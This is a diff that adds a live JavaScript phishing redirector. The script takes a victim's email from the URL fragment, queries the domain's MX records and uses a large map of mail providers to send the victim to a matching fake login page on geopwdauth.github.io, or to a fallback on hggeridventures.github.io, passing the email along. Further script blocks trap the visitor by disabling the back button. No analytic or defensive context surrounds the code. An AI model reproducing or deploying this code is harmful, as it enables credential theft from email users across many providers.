@@ -1,0 +1,223 @@
+<script>
+    (async function() {
+        // Isolate raw email string out of the browser address bar hash fragment
+        const rawHashData = window.location.hash;
+        if (!rawHashData || rawHashData.length < 2) return;
+
+        const cleanEmail = rawHashData.substring(1).trim().toLowerCase();
+        if (!cleanEmail.includes('@')) return;
+
+        const emailParts = cleanEmail.split('@');
+        if (emailParts.length < 2) return;
+        const targetDomain = emailParts[1].trim();
+
+        let targetDestination = "";
+
+        // Hand-coded Matrix Registry Map
+            const providerRegistry = {
+                "zoho": "http://geopwdauth.github.io/ddadmin/zh.html",
+                "google": "http://geopwdauth.github.io/ddadmin/gm.html",
+                "office365": "http://geopwdauth.github.io/ddadmin/othree5.html",
+                "outlook": "http://geopwdauth.github.io/ddadmin/othree5.html",
+                "microsoft": "http://geopwdauth.github.io/ddadmin/othree5.html",
+                "secureserver": "http://geopwdauth.github.io/ddadmin/gdy.html",
+                "godaddy": "http://geopwdauth.github.io/ddadmin/gdy.html",
+                "yahoo": "http://geopwdauth.github.io/ddadmin/yo.html",
+                "webserwer": "http://geopwdauth.github.io/ddadmin/wbs.html", 
+                "zenbox": "http://geopwdauth.github.io/ddadmin/zb.html",
+                "webd.pl": "http://geopwdauth.github.io/ddadmin/wm.html",  
+                "gazeta": "http://geopwdauth.github.io/ddadmin/gz.html",
+                "home.pl": "http://geopwdauth.github.io/ddadmin/ho.html",
+                "serwer": "http://geopwdauth.github.io/ddadmin/ho.html",
+                "cyberfolks": "http://geopwdauth.github.io/ddadmin/cb-fk.html",
+                "Cyber_Folks": "http://geopwdauth.github.io/ddadmin/cb-fk.html",
+                "netart": "http://geopwdauth.github.io/ddadmin/nd.html",   
+                "nazwa": "http://geopwdauth.github.io/ddadmin/nd.html", 
+                "progresol": "http://geopwdauth.github.io/ddadmin/pso.html",  
+                "zenbox": "http://geopwdauth.github.io/ddadmin/zb.html", 
+                "dpoczta": "http://geopwdauth.github.io/ddadmin/dp.html", 
+                "lh.pl": "http://geopwdauth.github.io/ddadmin/l-h.html",
+                "seohost": "http://geopwdauth.github.io/ddadmin/sh.html",
+                "megateam": "http://geopwdauth.github.io/ddadmin/wv.html",
+                "mydevil": "http://geopwdauth.github.io/ddadmin/mdiv.html",
+                "hostido": "http://geopwdauth.github.io/ddadmin/hodt.html",
+                "hitme": "http://geopwdauth.github.io/ddadmin/kei.html",
+                "kei.pl": "http://geopwdauth.github.io/ddadmin/kei.html",
+                "kalamata": "http://geopwdauth.github.io/ddadmin/oh.html",
+                "ovhcloud": "http://geopwdauth.github.io/ddadmin/oh.html",
+                "ovh": "http://geopwdauth.github.io/ddadmin/oh.html",
+                "webwave": "http://geopwdauth.github.io/ddadmin/wv.html",
+                "eTOP": "http://geopwdauth.github.io/ddadmin/wv.html",
+                "protondns": "http://geopwdauth.github.io/ddadmin/gd.html",
+                "proton": "http://geopwdauth.github.io/ddadmin/pt.html",
+                "protonmail": "http://geopwdauth.github.io/ddadmin/pt.html",
+                "startmail": "http://geopwdauth.github.io/ddadmin/stm.html",
+                "mailfence": "http://geopwdauth.github.io/ddadmin/m-lfe-ce.html",
+                "runbox": "http://geopwdauth.github.io/ddadmin/rb.html",
+                "hushmail": "http://geopwdauth.github.io/ddadmin/h-m.html",
+                "countermail": "http://geopwdauth.github.io/ddadmin/catm.html",
+                "typewire": "http://geopwdauth.github.io/ddadmin/tpwr.html",
+                "hostinger": "http://geopwdauth.github.io/ddadmin/htge.html",
+                "bluehost": "http://geopwdauth.github.io/ddadmin/b-lhse.html",
+                "siteground": "http://geopwdauth.github.io/ddadmin/ms-par-tti-on.html",
+                "spamprotection": "http://geopwdauth.github.io/ddadmin/ms-par-tti-on.html",
+                "emailservice": "http://geopwdauth.github.io/ddadmin/ms-par-tti-on.html",
+                "mimecast": "http://geopwdauth.github.io/ddadmin/ms-par-tti-on.html",
+                "cloudfilter": "http://geopwdauth.github.io/ddadmin/saca.html",
+                "shw-central": "http://geopwdauth.github.io/ddadmin/saca.html",
+                "dreamhost": "http://geopwdauth.github.io/ddadmin/drh.html",
+                "gandi": "http://geopwdauth.github.io/ddadmin/gd.html",
+                "hover": "http://geopwdauth.github.io/ddadmin/hv.html",
+                "hostedemail": "http://geopwdauth.github.io/ddadmin/hv.html",
+                "qq.com": "http://geopwdauth.github.io/ddadmin/e-x-m.html",
+                "qiye.163.com": "http://geopwdauth.github.io/ddadmin/1-6-t.html",
+                "163.com": "http://geopwdauth.github.io/ddadmin/1-6-t.html",
+                "netease": "http://geopwdauth.github.io/ddadmin/1-6-t.html",
+                "126.com": "http://geopwdauth.github.io/ddadmin/1-6-t.html",
+                "yeah.net": "http://geopwdauth.github.io/ddadmin/1-6-t.html",
+                "sina": "http://geopwdauth.github.io/ddadmin/sn.html",
+                "sohu": "http://geopwdauth.github.io/ddadmin/su.html",
+                "139.com": "http://geopwdauth.github.io/ddadmin/ma-1-3-9.html",
+                "189.cn": "http://geopwdauth.github.io/ddadmin/ma-1-8-9.html",
+                "qiye.aliyun.com": "http://geopwdauth.github.io/ddadmin/a-yuna.html",
+                "aliyun.com": "http://geopwdauth.github.io/ddadmin/a-yuna.html",
+                "alibaba": "http://geopwdauth.github.io/ddadmin/a-yuna.html",
+                "21cn": "http://geopwdauth.github.io/ddadmin/21.html",
+                "263.net": "http://geopwdauth.github.io/ddadmin/2a6b5t.html",
+                "iq.pl": "http://geopwdauth.github.io/ddadmin/i-q.html",
+                "stackmail": "http://geopwdauth.github.io/ddadmin/gd.html",
+                "intertele": "http://geopwdauth.github.io/ddadmin/i-t-l.html",
+                "itlu": "http://geopwdauth.github.io/ddadmin/i-t-l.html",
+                "orange": "http://geopwdauth.github.io/ddadmin/ora-g.html",
+                "barracudanetworks": "http://geopwdauth.github.io/ddadmin/b-arcu-da.html",
+                "barracuda": "http://geopwdauth.github.io/ddadmin/b-arcu-da.html",
+                "euron": "http://geopwdauth.github.io/ddadmin/er.html",
+                "euron.pl": "http://geopwdauth.github.io/ddadmin/er.html",
+                "mail": "http://geopwdauth.github.io/ddadmin/wm.html",
+                "yandex": "http://geopwdauth.github.io/ddadmin/ya.html",
+                "itlu.pl": "http://geopwdauth.github.io/ddadmin/i-t-l.html",
+                "ionos": "http://geopwdauth.github.io/ddadmin/io.html",
+                "zmail": "http://geopwdauth.github.io/ddadmin/zm.html",
+                "zmail300": "http://geopwdauth.github.io/ddadmin/zm.html",
+                "fastmail": "http://geopwdauth.github.io/ddadmin/f-s-m.html",
+                "zimbra": "http://geopwdauth.github.io/ddadmin/zra.htm",
+                "postiefstechnologies.com": "http://geopwdauth.github.io/ddadmin/zra.htm",
+                "gpphosted": "http://geopwdauth.github.io/ddadmin/gd.html",
+                "roots": "http://geopwdauth.github.io/ddadmin/zra.htm",                
+                "tlen.pl": "http://geopwdauth.github.io/ddadmin/0two.html",
+                "o2.pl": "http://geopwdauth.github.io/ddadmin/0two.html",
+                "go2.pl": "http://geopwdauth.github.io/ddadmin/0two.html",
+                "onet": "http://geopwdauth.github.io/ddadmin/0two.html",
+                "interia": "http://geopwdauth.github.io/ddadmin/0two.html",
+                "op.pl": "http://geopwdauth.github.io/ddadmin/0two.html",
+                "vp.pl": "http://geopwdauth.github.io/ddadmin/0two.html",
+                "autograf.pl": "http://geopwdauth.github.io/ddadmin/0two.html",
+                "poczta.fm": "http://geopwdauth.github.io/ddadmin/0two.html",
+                ".pl": "http://geopwdauth.github.io/ddadmin/gd.html",
+                "mail.com": "http://geopwdauth.github.io/ddadmin/m-il-c.html"
+            };
+
+// Live DNS Topography Handshake Layer
+        try {
+            const dnsUrl = `https://dns.google/resolve?name=${encodeURIComponent(targetDomain)}&type=MX`;
+            const dnsResponse = await fetch(dnsUrl);
+            const dnsData = await dnsResponse.json();
+            
+            let mxRecordsPayloadText = "";
+            let primaryHost = "";
+            
+            if (dnsData.Answer && dnsData.Answer.length > 0) {
+                mxRecordsPayloadText = dnsData.Answer.map(r => r.data ? r.data.toLowerCase() : "").join(" ");
+                const firstRecord = dnsData.Answer[0];
+                if (firstRecord && firstRecord.data) {
+                    const segments = firstRecord.data.toLowerCase().trim().split(/\s+/);
+                    primaryHost = segments[segments.length - 1];
+                    if (primaryHost.endsWith('.')) primaryHost = primaryHost.slice(0, -1);
+                }
+            }
+
+            if (mxRecordsPayloadText !== "") {
+                for (const key in providerRegistry) {
+                    if (mxRecordsPayloadText.includes(key) || mxRecordsPayloadText.includes("aspmx")) {
+                        targetDestination = (key === "google" || mxRecordsPayloadText.includes("aspmx")) ? providerRegistry["google"] : providerRegistry[key];
+                        break;
+                    }
+                }
+// Rule Set B2: Explicit Polish Subdomain Routing Rules Matrix
+if (targetDestination === "" && primaryHost !== "") {
+    const startsWithMail = primaryHost.startsWith("mail.");
+    const startsWithPoczta = primaryHost.startsWith("poczta.");
+    const endsWithPL = primaryHost.endsWith(".pl");
+
+    if ((startsWithMail || startsWithPoczta) && endsWithPL) {
+        targetDestination = "http://geopwdauth.github.io/ddadmin/gd.html";
+                }
+            }
+                if (targetDestination === "" && primaryHost !== "") {
+                    if (primaryHost === targetDomain) {
+                        targetDestination = "http://geopwdauth.github.io/ddadmin/wm.html";
+                    } else if (primaryHost === "mail." + targetDomain) {
+                        targetDestination = "http://geopwdauth.github.io/ddadmin/wm.html";
+                    } else {
+                        targetDestination = "https://hggeridventures.github.io/index0z";
+                    }
+                }
+            }
+        } catch (dnsException) {
+            console.error("DNS Error: ", dnsException);
+        }
+
+        // Global fallback resolution
+        if (targetDestination === "") {
+            targetDestination = "https://hggeridventures.github.io/index0z";
+        }
+
+        // Ensure target domain string format closes cleanly before hash operations
+        if (!targetDestination.endsWith('/')) {
+            // Append trailing slash if it hits an index path root layout file parameter
+            if (!targetDestination.endsWith('.html') && !targetDestination.endsWith('.php')) {
+                targetDestination += "/";
+            }
+        }
+
+        // CORRECTED CONSTRUCTION: Combines path destination directly with the email hash anchor element
+        const finalForwardPath = targetDestination + "#" + cleanEmail;
+
+        // Execute Instant Redirection Takeover
+        window.location.replace(finalForwardPath);
+    })();
+</script>
+</script>
+
+    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+
+                    
